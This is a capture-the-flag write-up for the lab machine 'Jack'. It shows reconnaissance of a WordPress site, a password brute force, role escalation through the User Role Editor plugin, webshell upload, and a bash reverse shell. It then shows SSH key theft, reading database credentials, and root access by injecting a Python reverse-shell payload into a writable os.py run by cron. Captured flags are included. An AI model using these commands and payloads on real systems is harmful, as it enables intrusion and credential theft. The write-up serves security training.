
# CTF Writeup: Jack

---
## Reconaissance

An initial scan revealed the following running services on the target server.

```
nmap -n -Pn -sS -p- 10.113.182.129        
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 17:52 CDT
Nmap scan report for 10.113.182.129
Host is up (0.013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 31.76 seconds
```

Another more detailled scan revealed information about the running services.

```
nmap -n -Pn -sSCV -p 22,80 10.113.182.129
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 17:53 CDT
Nmap scan report for 10.113.182.129
Host is up (0.012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e:79:78:08:93:31:d0:83:7f:e2:bc:b6:14:bf:5d:9b (RSA)
|   256 3a:67:9f:af:7e:66:fa:e3:f8:c7:54:49:63:38:a2:93 (ECDSA)
|_  256 8c:ef:55:b0:23:73:2c:14:09:45:22:ac:84:cb:40:d2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Jack&#039;s Personal Site &#8211; Blog for Jacks writing adven...
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 5.3.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.38 seconds
```

Mapped target ip to domain "jack.thm" in our local dns file.

```
echo "10.113.182.129 jack.thm" | tee -a /etc/hosts
10.113.182.129 jack.thm
```

The nmap scan gave us information about an exposed WordPress Admin Panel and the WordPress Version "5.3.2".

Let's start of by doing an strong wpscan.

Ran the scan and gained information about an exposed xmlrpc.php endpoint & 2 running plugins.

```
wpscan --url http://jack.thm --enumerate p --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://jack.thm/ [10.113.182.129]
[+] Started: Wed May  6 17:58:42 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://jack.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://jack.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>

[+] WordPress theme in use: online-portfolio
 | Location: http://jack.thm/wp-content/themes/online-portfolio/
 | Last Updated: 2024-02-05T00:00:00.000Z
 | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
 | [!] The version is out of date, the latest version is 0.1.1
 | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
 | Style Name: Online Portfolio
 | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
 | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
 | Author: Ample Themes
 | Author URI: https://amplethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'

[+] Enumerating Most Popular Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:14 <=============================> (1500 / 1500) 100.00% Time: 00:00:14
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://jack.thm/wp-content/plugins/akismet/
 | Last Updated: 2025-11-12T16:31:00.000Z
 | Readme: http://jack.thm/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.6
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/akismet/, status: 200
 |
 | Version: 3.1.7 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/akismet/readme.txt

[+] user-role-editor
 | Location: http://jack.thm/wp-content/plugins/user-role-editor/
 | Last Updated: 2025-12-02T03:45:00.000Z
 | Readme: http://jack.thm/wp-content/plugins/user-role-editor/readme.txt
 | [!] The version is out of date, the latest version is 4.64.6
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/user-role-editor/, status: 200
 |
 | Version: 4.24 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/user-role-editor/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed May  6 17:59:04 2026
[+] Requests Done: 1541
[+] Cached Requests: 11
[+] Data Sent: 401.772 KB
[+] Data Received: 655.537 KB
[+] Memory used: 272.25 MB
[+] Elapsed time: 00:00:21
```

Ran another scan to enumerate users

```
[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed May  6 18:41:53 2026
[+] Requests Done: 59
[+] Cached Requests: 9
[+] Data Sent: 14.86 KB
[+] Data Received: 371.931 KB
[+] Memory used: 186.066 MB
[+] Elapsed time: 00:00:04
```

Created an wordlist for users.

```
jack
wendy
danny
```

Did another wpscan bruteforce with the retrieved usernames.

```
wpscan --url http://jack.thm -U users.txt -P /usr/share/wordlists/fasttrack.txt
```

Gained Credentials for user "wendy".

```
[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - wendy / changelater
```

Logged into the admin panel as an low privileged user.

Wendy seems to be an low privileged user. 

In order to elevate my privileges within the WordPress CMS, I navigated to Profile and made any change. I utilized BurpSuite to intercept the network package & under all the parameters I added the following:

```
&ure_other_roles=administrator
```

After forwarding the package I gained Administrator.

I navigated to Plugins > Plugin Editor and replaced akismet.php with wolfswebshell.php.

Navigated to the following URL and gained command execution.

```
http://jack.thm/wp-content/plugins/akismet/akismet.php
```

Started up listener on port 80.

```
nc -lvnp 80
```

Executed the following bash reverse shell command.

```
/bin/bash -c 'bash -i >& /dev/tcp/192.168.227.246/80 0>&1'
```

Gained RCE as user "www-data".

```
nc -lvnp 80                              
listening on [any] 80 ...
connect to [192.168.227.246] from (UNKNOWN) [10.112.163.83] 35466
bash: cannot set terminal process group (1239): Inappropriate ioctl for device
bash: no job control in this shell
www-data@jack:/var/www/html/wp-content/plugins/akismet$
```

Retrieved user.txt in /home/jack directory.

```
0052f7829e48752f2e7bf50f1231548a
```

Found an SSH Private Key inside /var/backups.

```
www-data@jack:/var/backups$ ls -la
total 776
drwxr-xr-x  2 root root     4096 Jan 10  2020 .
drwxr-xr-x 14 root root     4096 Jan  9  2020 ..
-rw-r--r--  1 root root    40960 Jan  9  2020 alternatives.tar.0
-rw-r--r--  1 root root     9931 Jan  9  2020 apt.extended_states.0
-rw-r--r--  1 root root      713 Jan  8  2020 apt.extended_states.1.gz
-rw-r--r--  1 root root       11 Jan  8  2020 dpkg.arch.0
-rw-r--r--  1 root root       43 Jan  8  2020 dpkg.arch.1.gz
-rw-r--r--  1 root root      437 Jan  8  2020 dpkg.diversions.0
-rw-r--r--  1 root root      202 Jan  8  2020 dpkg.diversions.1.gz
-rw-r--r--  1 root root      207 Jan  9  2020 dpkg.statoverride.0
-rw-r--r--  1 root root      129 Jan  8  2020 dpkg.statoverride.1.gz
-rw-r--r--  1 root root   552673 Jan  9  2020 dpkg.status.0
-rw-r--r--  1 root root   129487 Jan  8  2020 dpkg.status.1.gz
-rw-------  1 root root      813 Jan 10  2020 group.bak
-rw-------  1 root shadow    679 Jan 10  2020 gshadow.bak
-rwxrwxrwx  1 root root     1675 Jan 10  2020 id_rsa
-rw-------  1 root root     1626 Jan  9  2020 passwd.bak
-rw-------  1 root shadow   1066 Jan 10  2020 shadow.bak
```

Saved it locally and gave it proper permissions.

```
chmod 600 id_rsa33
```

Connected to user "jack" via SSH.

```
ssh -i id_rsa33 jack@10.112.163.83
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

143 packages can be updated.
92 updates are security updates.


Last login: Thu May  7 08:00:58 2026 from 192.168.227.246
jack@jack:~$ 
```
Switched back to my shell as user "www-data" since I discovered that there is an internal MySQL Database running.

```
www-data@jack:/var/www/html$ netstat -tulnp 
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

Enumerated the wp-config.php file for database credentials and retrieved the following:

```
/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'password');
```

Connected to database as user "wordpressuser".

```
ww-data@jack:/var/www/html$ mysql -h 127.0.0.1 -u wordpressuser -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 193
Server version: 10.0.38-MariaDB-0ubuntu0.16.04.1 Ubuntu 16.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Utilized the following queries in order to view the encrypted passwords for user jack, wendy & danny.

```
SHOW databases;
use wordpress;
SHOW tables;
SELECT * FROM wp_users;
```

Saved the encrypted hashes and tried to bruteforce with john the ripper & hashcat, but it didn't work.

I identified an interesting python script which get's executed with root permissions.

```
jack@jack:/opt/statuscheck$ cat checker.py 
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
```

The python module "os" is being utilized, I'm checking which write permissions user "jack" has.

```
find / -writable 2>/dev/null | grep -v "^/proc\|^/sys\|^/run"
/usr/lib/python2.7/os.py
```

We have write permissions on the python os module. Let's inject an bash shell reverse shell script inside it. The script should be executed automatically since it's running as cronjob & then we should gain RCE.

Inserted the following payload into os.py

```
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.227.246",443))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)    
pty.spawn("/bin/bash")
```

Started up listener on port 443

```
nc -lvnp 443
```

Gained RCE as user "root".

```
nc -lvnp 443                             
listening on [any] 443 ...
connect to [192.168.227.246] from (UNKNOWN) [10.114.184.13] 47210
root@jack:~#
```

Retrieved root.txt in /root directory.

```
b8b63a861cc09e853f29d8055d64bffb
```